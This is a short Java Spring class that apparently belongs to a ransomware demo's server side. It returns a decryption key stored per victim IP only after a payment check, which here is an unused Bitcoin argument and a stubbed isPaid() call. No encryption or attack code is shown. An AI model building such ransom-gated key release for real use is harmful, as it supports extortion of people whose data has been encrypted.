package app.bl;

import java.util.Optional;

import javax.inject.Inject;

import org.springframework.stereotype.Component;

import app.entities.Bitcoin;
import app.entities.CryptoKey;
import app.exceptions.DecryptionLogicException;
import app.exceptions.PaymentNotFoundException;
import app.repositories.KeyRepository;

@Component
public class DecryptionLogic {

	@Inject
	private KeyRepository repository;
	private PaymentProcess clientPayment;

	public DecryptionLogic() {
		clientPayment = new PaymentProcess();
	}

	public CryptoKey getKey(String ip, Bitcoin btc) throws PaymentNotFoundException, DecryptionLogicException {
		if (clientPayment.isPaid()) {
			Optional<CryptoKey> key = repository.findById(ip);
			if (key.isPresent()) {
				return key.get();
			} else {
				throw new DecryptionLogicException("Decryption process failed");
			}
		}
		throw new PaymentNotFoundException();
	}
}
